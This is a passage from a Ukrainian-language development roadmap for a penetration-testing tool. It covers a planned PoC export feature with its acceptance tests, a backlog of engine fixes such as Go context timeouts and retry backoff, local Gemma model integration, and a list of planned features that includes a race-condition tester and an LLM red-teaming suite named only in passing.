    3. **Go Standalone (`main.go`):** для високошвидкісних Race Condition (`Last-Byte Sync`) знахідок, де `curl` та звичайний Python не здатні відтворити одночасний удар по сокетах.
    4. **Відформатований `curl` / HTTPie сниппет:** з усіма прапорцями маршруту (`--proxy`, `--insecure`, `--data-binary`).
  - **UI інтеграція:** кнопка **«Експорт PoC ▾»** у картці знахідки сканера (`showHubFindingDrawer`), у тулбарі `Повторювача` та в контекстному меню рядка таблиці.
  - **Критерії приймання:** згенерований Python PoC-скрипт синтаксично валідний (`ast.parse`), запускається на локальній фікстурі без жодних зовнішніх пакетів і коректно повертає `[+] VULNERABLE` на вразливому ендпоінті та `[-] PATCHED` після виправлення; тести в `web/lab/test_poc_generator.py`.

---

## НАСТУПНИЙ КРОК

Порядок актуального беклогу за пріоритетом:

**Абсолютний пріоритет (впроваджувати зараз) — Фаза 2.3: Повний cancellation path та `context.WithTimeout` у Go Engine:**
Рушій здійснює мережеві виклики (зокрема `engine/osint_transforms.go`), де наразі відсутні тайм-аути контексту (`0 WithTimeout`). Це загрожує зависанням горутин і блокуванням сокетів при повільних з'єднаннях. Кожен мережевий запит має отримати контекст із дедлайном і коректно реагувати на переривання.

**Наступні бекенд-завдання (Рівень 2 / P1):**
1. **Clustering-based мутації та adaptive backoff:** кластеризація базових відповідей у активному сканері та врахування `Retry-After` (429/503).
2. **Відновлення брокерних workflow-ранів (Фаза 6.2):** не позначати живі брокерні завдання `interrupted` при рестарті веб-сервера.
3. **Вихідні Webhook-сповіщення (Фаза 5.1):** надійні нотифікації на знахідки `ScannerRun.findings`.

**Продуктивність оператора, локальний AI та стратегічні кілер-фічі (Рівень 3–4 / P2–P3):**
- **Repeater:** режими перегляду Pretty / Raw у відповідях.
- **N1 (EmbeddingGemma 2 + Gemma 4 `e2b`/`e4b`):** дворівнева локальна AI-архітектура (он-деманд сенсор 270M/8K MRL 128/256d для аномалій Intruder, кластеризації сканера, тріажу JS та маршрутизації 546 скілів + локальний ReAct-оператор `gemma4:e2b`/`e4b`).
- **N4 (Тест MCP на Gemma 4 через Ollama):** верифікація tool-calling (`gemma4:e2b` / `gemma4:e4b` + `embeddinggemma-2`) через реальний stdio JSON-RPC.
- **Топ-10 кілер-фіч (F1–F10):**
  - Перша хвиля (максимальний ефект для щоденного пентесту): **F1** (`Live Auth Matrix`), **F2** (`Live Request Macros`), **F9** (`Context-Aware Param Miner & Mass Assignment`), **F10** (`One-Click Reproducible PoC Compiler`).
  - Друга хвиля (глибока автоматизація та протоколи): **F3** (`Race Condition Chronograph`), **F4** (`Stateful Traffic Auto-Chaining`), **F5** (`JWT & Crypto Forge Studio`).
  - Третя хвиля (телеметрія DOM, моніторинг поверхні та AI Red-Teaming): **F6** (`Attack Surface Drift Radar`), **F7** (`Browser-Worker Live DOM Sink Telemetry`), **F8** (`Target AI/LLM Red-Teaming Suite`).
